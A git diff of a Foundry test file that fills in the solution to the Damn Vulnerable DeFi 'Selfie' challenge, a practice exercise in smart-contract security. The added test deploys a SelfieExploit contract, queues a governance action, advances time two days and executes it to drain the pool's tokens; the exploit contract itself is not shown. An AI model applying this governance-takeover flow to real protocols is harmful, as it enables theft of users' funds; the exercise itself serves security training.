@@ -3,6 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
+import {SelfieExploit} from "./SelfieExploit.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
@@ -58,11 +59,16 @@ contract SelfieChallenge is Test {
         assertEq(pool.flashFee(address(token), 0), 0);
     }
 
-    /**
-     * CODE YOUR SOLUTION HERE
-     */
     function test_selfie() public checkSolvedByPlayer {
-        
+        SelfieExploit exploit = new SelfieExploit(
+            address(pool),
+            address(governance),
+            address(token),
+            recovery
+        );
+        exploit.queueAction();
+        vm.warp(block.timestamp + 2 days); // fast-forward 2 days
+        exploit.executeAction();
     }
 
     /**
@@ -71,6 +77,10 @@ contract SelfieChallenge is Test {
     function _isSolved() private view {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
-        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            TOKENS_IN_POOL,
+            "Not enough tokens in recovery account"
+        );
     }
 }
